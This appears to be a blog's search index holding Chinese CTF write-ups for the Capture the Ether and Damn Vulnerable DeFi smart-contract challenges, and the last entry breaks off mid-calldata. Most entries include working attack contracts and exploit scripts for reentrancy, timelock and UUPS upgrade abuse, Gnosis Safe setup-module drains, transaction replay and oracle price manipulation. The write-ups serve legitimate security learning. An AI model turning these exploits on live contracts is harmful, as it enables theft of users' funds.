<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>capture the ether(下)</title>
      <link href="/2023/03/19/capture-the-ether-%E4%B8%8B/"/>
      <url>/2023/03/19/capture-the-ether-%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="capture-the-ether-下"><a href="#capture-the-ether-下" class="headerlink" title="capture the ether(下)"></a>capture the ether(下)</h1><h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;interface IName {    function name() external view returns (bytes32);}contract FuzzyIdentityChallenge {    bool public isComplete;    function authenticate() public {        require(isSmarx(msg.sender));        require(isBadCode(msg.sender));        isComplete = true;    }    function isSmarx(address addr) internal view returns (bool) {        return IName(addr).name() == bytes32("smarx");    }    function isBadCode(address _addr) internal pure returns (bool) {        bytes20 addr = bytes20(_addr);        bytes20 id = hex"000000000000000000000000000000000badc0de";        bytes20 mask = hex"000000000000000000000000000000000fffffff";        for (uint256 i = 0; i < 34; i++) {            if (addr & mask == id) {                return true;            }            mask <<= 4;            id <<= 4;        }        return false;    }}</code></pre><p>这题主要考creat2;</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;import "./text0.sol";contract attack{    function name() public returns (bytes32){        return bytes32("smarx");    }    function att(address _Fuzzy) public {        FuzzyIdentityChallenge(_Fuzzy).authenticate();    }}contract Creat2Factory{    function getBytecode() public returns (bytes memory){        bytes memory attackCode = hex"";        return attackCode;    }    function JaoBen(bytes memory attackCode,uint i,uint j) public returns(address ,uint){        bytes memory attackCodes = attackCode;        bytes20 s1 = hex"000000000000000000000000000000000badc0de";        bytes20 s2 = hex"000000000000000000000000000000000fffffff";        for(i;i<j;i++){            bytes32 hash = keccak256(abi.encodePacked(                bytes1(0xff),address(this),i, keccak256(attackCodes)            ));            for (uint256 k = 0; k < 34; k++) {            if (bytes20(uint160(uint(hash)))&s2 == s1) {                return (address(uint160(uint(hash))),i);            }         }      }    }}</code></pre><h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;interface ITokenReceiver {    function tokenFallback(address from, uint256 value, bytes data) external;}contract SimpleERC223Token {    // Track how many tokens are owned by each address.    mapping (address => uint256) public balanceOf;    string public name = "Simple ERC223 Token";    string public symbol = "SET";    uint8 public decimals = 18;    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);    event Transfer(address indexed from, address indexed to, uint256 value);    function SimpleERC223Token() public {        balanceOf[msg.sender] = totalSupply;        emit Transfer(address(0), msg.sender, totalSupply);    }    function isContract(address _addr) private view returns (bool is_contract) {        uint length;        assembly {            //retrieve the size of the code on target address, this needs assembly            length := extcodesize(_addr)        }        return length > 0;    }     function transfer(address to, uint256 value) public returns (bool success) {        bytes memory empty;        return transfer(to, value, empty);    }    function transfer(address to, uint256 value, bytes data) public returns (bool) {        require(balanceOf[msg.sender] >= value);        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);        if (isContract(to)) {            ITokenReceiver(to).tokenFallback(msg.sender, value, data);        }        return true;    }    event Approval(address indexed owner, address indexed spender, uint256 value);    mapping(address => mapping(address => uint256)) public allowance;    function approve(address spender, uint256 value)        public        returns (bool success)    {        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    }    function transferFrom(address from, address to, uint256 value)        public        returns (bool success)    {        require(value <= balanceOf[from]);        require(value <= allowance[from][msg.sender]);        balanceOf[from] -= value;        balanceOf[to] += value;        allowance[from][msg.sender] -= value;        emit Transfer(from, to, value);        return true;    }}contract TokenBankChallenge {    SimpleERC223Token public token;    mapping(address => uint256) public balanceOf;    function TokenBankChallenge(address player) public {        token = new SimpleERC223Token();        // Divide up the 1,000,000 tokens, which are all initially assigned to        // the token contract's creator (this contract).        balanceOf[msg.sender] = 500000 * 10**18;  // half for me        balanceOf[player] = 500000 * 10**18;      // half for you    }    function isComplete() public view returns (bool) {        return token.balanceOf(this) == 0;    }    function tokenFallback(address from, uint256 value, bytes) public {        require(msg.sender == address(token));        require(balanceOf[from] + value >= balanceOf[from]);        balanceOf[from] += value;    }    function withdraw(uint256 amount) public {        require(balanceOf[msg.sender] >= amount);        require(token.transfer(msg.sender, amount));        balanceOf[msg.sender] -= amount;    }}</code></pre><p>withdraw函数有很明显的漏洞，它是先转后减的，我们可以借机重入。</p><pre class=" language-1"><code class="language-1">contract pwn{    SimpleERC223Token public token;    TokenBankChallenge public target;    uint8 public reentrytimes = 0;    bool  public startrenentry = false;    function pwn(){        token = SimpleERC223Token();        target = TokenBankChallenge();    }    function init(){        token.transfer(address(target),500000000000000000000000);    }    function start(){                target.withdraw(500000000000000000000000);    }    function tokenFallback(address from, uint256 value, bytes) public{    require(msg.sender == address(token));    if ( startrenentry && reentrytimes < 1){        reentrytimes += 1;        target.withdraw(500000000000000000000000);            }    if (startrenentry == false){        startrenentry = true;    }    }    function() payable{    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>capture the ether(上)</title>
      <link href="/2023/03/19/capture-the-ether-%E4%B8%8A/"/>
      <url>/2023/03/19/capture-the-ether-%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="capture-the-ether-上"><a href="#capture-the-ether-上" class="headerlink" title="capture the ether(上)"></a>capture the ether(上)</h1><h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract GuessTheNewNumberChallenge {    function GuessTheNewNumberChallenge() public payable {        require(msg.value == 0.001 ether);    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function guess(uint8 n) public payable {        require(msg.value == 0.001 ether);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        if (n == answer) {            msg.sender.transfer(0.002 ether);        }    }}</code></pre><p>很明显的伪随机数。因为合约之间的调用是在同一个区块当中的，也就是说，如果我们通过攻击合约进行调用guess，那么我们攻击合约生成的answer与guess生成的answer是相同的。</p><pre><code>contract attack{    Guess guesst;    function attack(address _addr)public{        guesst = Guess(_addr);    }    function attacks()public payable{        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        guesst.guess.value(0.001 ether)(answer);    }    function()external payable{                                           }}</code></pre><h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract PredictTheFutureChallenge {    address guesser;    uint8 guess;    uint256 settlementBlockNumber;    function PredictTheFutureChallenge() public payable {        require(msg.value == 1 ether);    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function lockInGuess(uint8 n) public payable {        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = n;        settlementBlockNumber = block.number + 1;    }    function settle() public {        require(msg.sender == guesser);        require(block.number > settlementBlockNumber);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        guesser = 0;        if (guess == answer) {            msg.sender.transfer(2 ether);        }    }}</code></pre><p>又是预测数很明显answer只在0~9之间。爆破即可。</p><pre class=" language-1"><code class="language-1">contract attack{    Predict guess;   function attack(address _addr)payable{       guess=Predict(_addr);       geuss.lockInGuess.value(1 ether)(5);    }    function attacks(address _addr)public payable{            uint8 n =5;       uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        if (n==answer){            guess.settle();                }else{            return;        }           }    function()external payable{    }}</code></pre><h2 id="Pridict-the-block-hash"><a href="#Pridict-the-block-hash" class="headerlink" title="Pridict the block hash"></a>Pridict the block hash</h2><pre class=" language-1"><code class="language-1">contract PredictTheBlockHashChallenge {    address guesser;    bytes32 guess;    uint256 settlementBlockNumber;    function PredictTheBlockHashChallenge() public payable {        require(msg.value == 0.001 ether);    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function lockInGuess(bytes32 hash) public payable {        require(guesser == 0);        require(msg.value == 0.001 ether);        guesser = msg.sender;        guess = hash;        settlementBlockNumber = block.number + 1;    }    function settle() public {        require(msg.sender == guesser);        require(block.number > settlementBlockNumber);        bytes32 answer = block.blockhash(settlementBlockNumber);        guesser = 0;        if (guess == answer) {            msg.sender.transfer(0.002 ether);        }    }}</code></pre><p>这个题需要我们提前知道后一个区块的区块哈希。block.blockhash只能得到256个区块内的哈希值，一旦超过256的区块，就会返回0。</p><pre class=" language-1"><code class="language-1">contract attack{    Predict guess;    uint256 public blocknumber;    bytes32 answer;    function attack(address _addr)public{        guess = Predict(_addr);    }    function lock()public payable{        blocknumber = block.number+1;        guess.lockInGuess.value(0.001 ether)(answer);    }    function attacks()public{        require(block.number-256>blocknumber);        guess.settle();    }    function ()external payable{    }}</code></pre><h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract TokenWhaleChallenge {    address player;    uint256 public totalSupply;    mapping(address => uint256) public balanceOf;    mapping(address => mapping(address => uint256)) public allowance;    string public name = "Simple ERC20 Token";    string public symbol = "SET";    uint8 public decimals = 18;    function TokenWhaleChallenge(address _player) public {        player = _player;        totalSupply = 1000;        balanceOf[player] = 1000;    }    function isComplete() public view returns (bool) {        return balanceOf[player] >= 1000000;    }    event Transfer(address indexed from, address indexed to, uint256 value);    function _transfer(address to, uint256 value) internal {        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);    }    function transfer(address to, uint256 value) public {        require(balanceOf[msg.sender] >= value);        require(balanceOf[to] + value >= balanceOf[to]);        _transfer(to, value);    }    event Approval(address indexed owner, address indexed spender, uint256 value);    function approve(address spender, uint256 value) public {        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);    }    function transferFrom(address from, address to, uint256 value) public {        require(balanceOf[from] >= value);        require(balanceOf[to] + value >= balanceOf[to]);        require(allowance[from][msg.sender] >= value);        allowance[from][msg.sender] -= value;        _transfer(to, value);    }}</code></pre><p>这题有逻辑漏洞和下溢。transferFrom前面一系列检查都是检查的from，然而转账的时候却是转的msg.sender。且balanceOf[msg.sender] -= value存在下溢。</p><h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract RetirementFundChallenge {    uint256 startBalance;    address owner = msg.sender;    address beneficiary;    uint256 expiration = now + 10 years;    function RetirementFundChallenge(address player) public payable {        require(msg.value == 1 ether);        beneficiary = player;        startBalance = msg.value;    }    function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function withdraw() public {        require(msg.sender == owner);        if (now < expiration) {            // early withdrawal incurs a 10% penalty            msg.sender.transfer(address(this).balance * 9 / 10);        } else {            msg.sender.transfer(address(this).balance);        }    }    function collectPenalty() public {        require(msg.sender == beneficiary);        uint256 withdrawn = startBalance - address(this).balance;        // an early withdrawal occurred        require(withdrawn > 0);        // penalty is what's left        msg.sender.transfer(address(this).balance);    }}</code></pre><p>想要转走钱withdraw函数显然行不通。那只能是collectPenalty函数。只要让uint256 withdrawn = startBalance - address(this).balance下溢即可。<br>通过自毁合约强行转入1eth即可。</p><pre class=" language-1"><code class="language-1">contract attack{    function attacks(address _addr)public payable{        selfdestruct(_addr);    }}</code></pre><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract MappingChallenge {    bool public isComplete;    uint256[] map;    function set(uint256 key, uint256 value) public {        // Expand dynamic array as needed        if (map.length <= key) {            map.length = key + 1;        }        map[key] = value;    }    function get(uint256 key) public view returns (uint256) {        return map[key];    }}</code></pre><p>这题就是考对可变数组的储存的理解。</p><p>slot[0]存iscomplete,slot[1]存储数组的长度，数组的data存储在：keccak256(bytes(1))+x，x就是数组的下标。</p><p>计算数组data起始位：</p><pre class=" language-1"><code class="language-1">contract attack{    uint256 public i;    function attacks()public {      i =2**256-uint256(keccak256(bytes32(1)));    }}</code></pre><p>i就是我们算出来的slot[0]的位置。</p><h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.4.21;contract DonationChallenge {    struct Donation {        uint256 timestamp;        uint256 etherAmount;    }    Donation[] public donations;    address public owner;    function DonationChallenge() public payable {        require(msg.value == 1 ether);                owner = msg.sender;    }        function isComplete() public view returns (bool) {        return address(this).balance == 0;    }    function donate(uint256 etherAmount) public payable {        // amount is in ether, but msg.value is in wei        uint256 scale = 10**18 * 1 ether;        require(msg.value == etherAmount / scale);        Donation donation;        donation.timestamp = now;        donation.etherAmount = etherAmount;        donations.push(donation);    }    function withdraw() public {        require(msg.sender == owner);                msg.sender.transfer(address(this).balance);    }}</code></pre><p>注意到donate函数里面结构体的声明并没有初始化，也没有说明存储在那里，所以默认是在storage上，所以slot[0]是Donation[ ]，slot[1]是owner。又因为结构体在函数内非显式地初始化的时候会使用storage存储而不是memory，所以就可以达到变量覆盖的效果。我们用etherAmoun覆盖owner就行了。</p><h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>```1<br>pragma solidity ^0.4.21;</p><p>contract FiftyYearsChallenge {<br>    struct Contribution {<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    }<br>    Contribution[] queue;<br>    uint256 head;</p><pre><code>address owner;function FiftyYearsChallenge(address player) public payable {    require(msg.value == 1 ether);    owner = player;    queue.push(Contribution(msg.value, now + 50 years));}function isComplete() public view returns (bool) {    return address(this).balance == 0;}function upsert(uint256 index, uint256 timestamp) public payable {    require(msg.sender == owner);    if (index &gt;= head &amp;&amp; index &lt; queue.length) {        // Update existing contribution amount without updating timestamp.        Contribution storage contribution = queue[index];        contribution.amount += msg.value;    } else {        // Append a new contribution. Require that each contribution unlock        // at least 1 day after the previous one.        require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);        contribution.amount = msg.value;        contribution.unlockTimestamp = timestamp;        queue.push(contribution);    }}function withdraw(uint256 index) public {    require(msg.sender == owner);    require(now &gt;= queue[index].unlockTimestamp);    // Withdraw this and any earlier contributions.    uint256 total = 0;    for (uint256 i = head; i &lt;= index; i++) {        total += queue[i].amount;        // Reclaim storage.        delete queue[i];    }    // Move the head of the queue forward so we don't have to loop over    // already-withdrawn contributions.    head = index + 1;    msg.sender.transfer(total);}</code></pre><p>}<br>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days)很明显存在一个溢出的问题，只要数组最后一个元素的unlockTimestamp够大，就会出现溢出。</p><p>在upsert函数,当index小于数组长度时，就会覆盖原来的Contribution。 当index大于等于数组长度时，就会有新的Contribution，amount会覆盖queue的length，unlockTimestamp会覆盖head。</p><p>方法：<br>1：传入index（大于1）,timestamp为溢出值。<br>2：传入index（大于2）,timestamp为0。<br>3；调用withdraw函数。</p>]]></content>
      
      
      <categories>
          
          <category> 区块链安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 智能合约安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn-Defi-题解（下）</title>
      <link href="/2023/03/09/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2023/03/09/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi-题解-下"><a href="#Damn-Defi-题解-下" class="headerlink" title="Damn Defi 题解(下)"></a>Damn Defi 题解(下)</h1><h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>有一个Gnosis Safe的钱包注册表，注册表中有四十个DVT代币，我们要从注册表中取出所有资金。</p><p>写这题需要对GnosisSafeWallet的源码足够了解。</p><p>这题有2个主要函数。</p><p>addBeneficiary(): 添加受益人到注册表的函数,beneficiaries[]就是检测是否为注册表里有的地址。</p><p>proxyCreated(): 注册钱包的函数，注册完成，并且合约会给注册者发送十个dvt代币。</p><p>通过注释我们可以知道创建钱包时会执行函数createProxyWithCallback，再回调proxyCreated。因此我们把目光看向createProxyWithCallback函数</p><p>入参有四个：</p><p>1：address _singleton<br>这是一个单例地址</p><p>2：bytes memory initializer<br>这是初始化器的字节码，初始化函数其实就是GnosisSafe里的setup()函数</p><p>3：uint256 saltNonce<br>这是Create2里的随机数，我们不用关心</p><p>4：IProxyCreationCallback callback<br>这是回调合约的地址</p><p>注意到调用了createProxyWithNonce函数，这个函数内主要其实就是对initializer初始化函数的调用，只不过是用汇编实现的。</p><p>我们看到setup()函数,一眼就看到了setupModules(to, data);这明显是一个外部调用。到这其实思路有了。我们可以借此让钱包approve给我们所有的token，我们只需要把这个token转出来即可。</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import  "@openzeppelin/contracts/token/ERC20/IERC20.sol";import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";contract attack{   GnosisSafeProxyFactory public factory;   IProxyCreationCallback public callback;   address[] public users;   address public singleton;   address token;   constructor (address _factory,address _callback,address[] memory _users,address _singleton,address _token)public {    factory=GnosisSafeProxyFactory(_factory);    callback=IProxyCreationCallback(_callback);    users=_users;    singleton=_singleton;    token=_token;           }    function approve(address _token,address spender)public{        IERC20(_token).approve(spender,10 ether);    }    function attack()public {        bytes memory data=abi.encodeWithSignature("approve(address,address)",token,address(this));        for(uint256 i=0;i<users.length;i++){            address[] memory owners=new address[](1);            owners[0]=users[i];           bytes memory initializer=abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",                                    owners,                                    1,                                    address(this),                                    data,                                   address(0),                                   address(0),                                     0,                                   address(0)           );           GnosisSafeProxy proxy=factory.createProxyWithCallback(singleton,initializer,0,callback);           IERC20(token).transferFrom(address(proxy),tx.origin,10 ether);        }           }}</code></pre><h2 id="Climber"><a href="#Climber" class="headerlink" title="Climber"></a>Climber</h2><p>题目要求取走我们金库合约中所有代币。</p><p>此题用了UUPS代理模式，建议写题前先了解代理\现实合约。</p><p>ClimberVault：<br>很明显要取走所有代币要调用sweepFunds函数，但是有onlySweeper的限制。<br>因此我们可以通过合约升级，直接修改sweepFunds函数。</p><p>ClimberTimelock：</p><p>schedule()函数给要执行的操作给权限。</p><p>execute()为执行提供的操作。</p><p>到此思路已经很明显了。<br>1：授予攻击合约PROPOSER_ROLE<br>2：让delay变为0<br>3：升级climbervalut合约覆盖掉sweepfunds方法<br>4：将代币都发送到attacker的账户中。</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";import "./ClimberTimelock.sol";import "@openzeppelin/contracts/token/ERC20/IERC20.sol";import "./ClimberVault.sol";contract attack is UUPSUpgradeable{        ClimberTimelock timelock;         address vaultProxyAddress;         IERC20 token;         address  attacker;               constructor(ClimberTimelock _timelock,IERC20 _token,address _vaultProxyAddress)         {             attacker==msg.sender;             timelock=_timelock;             token=_token;             vaultProxyAddress=_vaultProxyAddress;         }               function creation() internal returns(address[]memory,uint256[]memory,bytes[]memory){              address[] memory target = new address[](5);              uint256[] memory value = new uint256[](5);              bytes[] memory data = new bytes[](5);              target[0] = address(timelock);              value[0] = 0;              data[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector,0);              target[1] = address(timelock);              value[1] = 0;              data[1] = abi.encodeWithSelector(AccessControl.grantRole.selector,timelock.PROPOSER_ROLE(),address(this));              target[2] = address(this);              value[2] = 0;              data[2] = abi.encodeWithSelector(attack.Apply.selector);              target[3] = address(vaultProxyAddress);              value[3] = 0;              data[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector,address(this));              target[4] = address(vaultProxyAddress);              value[4] = 0;              data[4] = abi.encodeWithSelector(attack.sweepFunds.selector);              return (target,value,data);         }             function Apply() external{             (                 address[] memory target,                 uint256[] memory value,                 bytes[] memory data             ) = creation();             timelock.schedule(target, value, data, 0);         }        function play() external{             (                 address[] memory target,                 uint256[] memory value,                 bytes[] memory data             ) = creation();             timelock.execute(target, value, data, 0);         }         function sweepFunds() external {             token.transfer(attacker,token.balanceOf(address(this)));         }                         function _authorizeUpgrade(address newIm) internal override {}}</code></pre><h2 id="Wallet-Mining"><a href="#Wallet-Mining" class="headerlink" title="Wallet Mining"></a>Wallet Mining</h2><p>题目要我们取走一个空地址中的token。</p><p>首先发现要求我们要能够部署factory、mastercopy合约，且还要在同一个地址。但player很明显也不是链上创建者的地址。</p><p>其实这题的关键是重放攻击。</p><p>我们先从etherscan上找到raw data（more -&gt; get Raw transaction Hash），随后在test/wallet-mining/wallet-mining.challenge.js中进行攻击。<br>此时，尽管是player假冒，但扣的依旧是victim的ETH。</p><pre><code>pragma solidity ^0.8.0;import "hardhat/console.sol";contract AttackWalletMining {  function test() public {    selfdestruct(payable(address(0)));  }  function proxiableUUID() external view returns (bytes32) {    return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;  }  // Explanation of GAS code  // TODO(0xth3g450pt1m1z0r) put some comments    function can(address u, address a) public view returns (bool) {        assembly {             // AUthorizer Upgrader proxy address (mom)            let m := sload(0)            // Ensure m has code            if iszero(extcodesize(m)) {return(0, 0)}            // load free memory address at 0x40 into p            let p := mload(0x40)            // store [p + 0x44] at 0x40 to update free memory pointer            mstore(0x40,add(p,0x44))            // store at p the sighash for the can() function in AuthorizeUpgrader            mstore(p,shl(0xe0,0x4538c4eb))            // store at p + 0x04 the imp address            mstore(add(p,0x04),u)            // store at p + 0x24 the aim address            mstore(add(p,0x24),a)            // Static call the function and check return is &gt; 0            if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}            // Check return data size is NOT zero AND return data is 0 then return false 0            if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}        }        return true;    }}</code></pre><pre><code>          const printPlayerTokenBalance = async () =&gt; {            let bal = await token.balanceOf(player.address);            log("Player balance = ", ethers.utils.formatEther(bal))        }        const data = require("./data.json");        log("Player address is", player.address)                const attackWalletDeployer = walletDeployer.connect(player);        const attackAuthorizer = authorizer.connect(player);        const tx = {            to: data.REPLAY_DEPLOY_ADDRESS,            value: ethers.utils.parseEther("1")        }        await player.sendTransaction(tx);        const deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();        const safeContractAddr = deploySafeTx.contractAddress;        log("Replayed deploy Master Safe Copy at", safeContractAddr);        const randomTx = await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();        const deployFactoryTx = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();        const factoryContractAddr = deployFactoryTx.contractAddress;        log("Replayed deploy safe factory at", factoryContractAddr);        const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);        const createInterface = (signature, methodName, arguments) =&gt; {            const ABI = signature;            const IFace = new ethers.utils.Interface(ABI);            const ABIData = IFace.encodeFunctionData(methodName, arguments);            return ABIData;        }        const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",                        "function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)",                        "function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)"];        const setupDummyABIData = createInterface(safeABI, "setup",  [            [player.address],            1,            ethers.constants.AddressZero,            0,            ethers.constants.AddressZero,            ethers.constants.AddressZero,            0,            ethers.constants.AddressZero,        ])        let nonceRequired = 0        let address = ""        while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {            address = ethers.utils.getContractAddress({                from: factoryContractAddr,                nonce: nonceRequired            });            nonceRequired += 1;        }        log(`Need to deploy ${nonceRequired} proxies to get access to 20mil`);        for (let i = 0; i &lt; nonceRequired ; i ++) {            await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);        }           const tokenABI = ["function transfer(address to, uint256 amount)"];        const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);        const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);        log("Version:", await depositAddrSafe.VERSION());                const transactionParams = [            token.address,            0,            tokenABIData,            0,            0,            0,            0,            ethers.constants.AddressZero,            ethers.constants.AddressZero,            0        ];        const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);        const signed = await player.signMessage(ethers.utils.arrayify(txhash));        const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();        log("Executing signed tx to transfer all tokens to player address");        await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);        await printPlayerTokenBalance()            const impSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";        let implementationAddress = "0x" + (await ethers.provider.getStorageAt(attackAuthorizer.address, impSlot)).slice(-40);        const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);        log("Deploying attacking contract");        const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);        const attackContract = await attackContractFactory.deploy();        const attackABI = ["function test()"];        const IAttack = createInterface(attackABI, "test", []);        log("Claiming ownership of implementation contract and upgrading to attacking contract");        await impContract.init([], []);        await impContract.upgradeToAndCall(attackContract.address, IAttack);        log("Deploying 43 proxies through Deployer and collecting tokens")        for (let i = 0; i &lt; 43; i ++) {            await (await attackWalletDeployer.drop(setupDummyABIData)).wait();        }        await printPlayerTokenBalance()</code></pre><p>这题我也不太懂，题解是抄一大佬的。</p><h2 id="Puppet-v3"><a href="#Puppet-v3" class="headerlink" title="Puppet v3"></a>Puppet v3</h2><p>Uniswap V3 采用TWAP(加权平均算法)。即随着时间比重算出加权后的价格。所以很明显，在同一笔交易内是不可能完成的了。</p><p>TWAP并不能防止“砸盘”，之所以能有效防止价格操纵，是因为随着时间的增加，进入了多人博弈。但在题中只有player。</p><pre><code>  /** CODE YOUR SOLUTION HERE */        const log = console.log;        const attackPool = await uniswapPool.connect(player);        const attackLendingPool = await lendingPool.connect(player);        const attackToken = await token.connect(player);        const attackWeth = await weth.connect(player);        const logBalances = async (name, address) =&gt; {            const dvt_bal = await attackToken.balanceOf(address);            const weth_bal = await weth.balanceOf(address);            const eth_bal = await ethers.provider.getBalance(address);            log(`Logging balance of ${name}`);            log('DVT:', ethers.utils.formatEther(dvt_bal))            log('WETH:', ethers.utils.formatEther(weth_bal))            log('ETH:', ethers.utils.formatEther(eth_bal))            log('')        };        await logBalances("Player", player.address)        const getQuote = async(amount, print=true) =&gt; {            const quote = await attackLendingPool.calculateDepositOfWETHRequired(amount);            if (print) log(`Quote of ${ethers.utils.formatEther(amount)} DVT is ${ethers.utils.formatEther(quote)} WETH`)            return quote        }        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";        log(`Connecting to uniswap router at mainnet address ${uniswapRouterAddress}`)        const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);        log("Approving all player tokens to be taken from the uniswap router");        await attackToken.approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);        log("Swapping all player tokens for as much WETH as possible.");        await uniswapRouter.exactInputSingle(            [attackToken.address,            weth.address,               3000,            player.address,            PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS            0,            0],            {                gasLimit: 1e7            }        );        await logBalances("Player", player.address)        await logBalances("Uniswap Pool", attackPool.address)        log("Increasing block time by 100 seconds")        await time.increase(100);        log("Getting new quote and approving lending pool for transfer");        const quote = await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);        await attackWeth.approve(attackLendingPool.address, quote);        log("Borrowing funds");        await attackLendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);        await logBalances("Player", player.address);        await logBalances("Lending Pool", attackLendingPool.address)</code></pre><h2 id="ABI-Smuggling"><a href="#ABI-Smuggling" class="headerlink" title="ABI Smuggling"></a>ABI Smuggling</h2><p>通过阅读合约发现想窃取vault中的资金，只能通过sweepFunds方法，而想使用sweepFunds方法只能通过execute方法。那么漏洞很明显存在于execute方法中。</p><pre><code>//deployer调用sweepFundsconst deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);//player调用withdraw;const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);</code></pre><p>在调用execute时，callData为</p><pre><code>//4 bytes Selector//0x00target//0x20actiondata location//0x40actiondata length//0x60actiondata contens</code></pre><p>execute中采用硬编码的方式得到selector，那我们为什么不对calldata动一些手脚呢？</p><pre><code>0x1cff79cd // execute000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512  // address(target)0000000000000000000000000000000000000000000000000000000000000080  // actiondata location 